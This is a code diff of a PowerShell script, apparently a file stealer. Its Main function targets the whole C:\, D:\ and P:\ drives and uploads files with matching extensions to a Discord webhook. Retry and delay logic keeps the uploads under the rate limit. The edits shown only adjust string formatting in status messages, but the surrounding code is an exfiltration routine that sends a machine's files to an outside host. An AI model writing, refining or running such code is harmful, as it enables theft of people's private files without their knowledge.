@@ -31,7 +31,7 @@ function Send-FileToDiscord {
             $FileSizeMB = ([System.IO.FileInfo]$FilePath).Length / 1MB
 
             if ($FileSizeMB -gt $MaxFileSizeMB) {
-                Write-Host "File too large to send to Discord: $FileName ($FileSizeMB MB)" -ForegroundColor Yellow
+                Write-Host "File too large to send to Discord: ${FileName} (${FileSizeMB} MB)" -ForegroundColor Yellow
                 return
             }
 
@@ -44,11 +44,11 @@ function Send-FileToDiscord {
             }
 
             $Response = Invoke-RestMethod -Uri $DiscordWebhookURL -Method Post -Body $Body -Headers $Headers
-            Write-Host "Sent file to Discord: $FileName" -ForegroundColor Green
+            Write-Host "Sent file to Discord: ${FileName}" -ForegroundColor Green
             Start-Sleep -Seconds $UploadDelaySeconds  # Add delay to reduce rate limit chances
             return
         } catch {
-            Write-Host "Attempt $attempt: Failed to send `${FilePath}` to Discord: $_" -ForegroundColor Yellow
+            Write-Host "Attempt ${attempt}: Failed to send `${FilePath}` to Discord: $_" -ForegroundColor Yellow
             if ($_.Exception.Response.StatusCode -eq 429) {
                 # Wait longer and retry if rate-limited
                 Write-Host "Rate limit hit. Waiting 10 seconds before retrying..." -ForegroundColor Cyan
@@ -100,7 +100,7 @@ function Main {
     # Hardcoded target directories
     $TargetDirectories = @("C:\", "D:\", "P:\")
 
-    Write-Host "Scanning directories: $TargetDirectories"
+    Write-Host "Scanning directories: ${TargetDirectories}"
 
     # Send files with matching extensions to Discord
     Scan-And-Send-Files -TargetDirectories $TargetDirectories -Extensions $FileExtensions
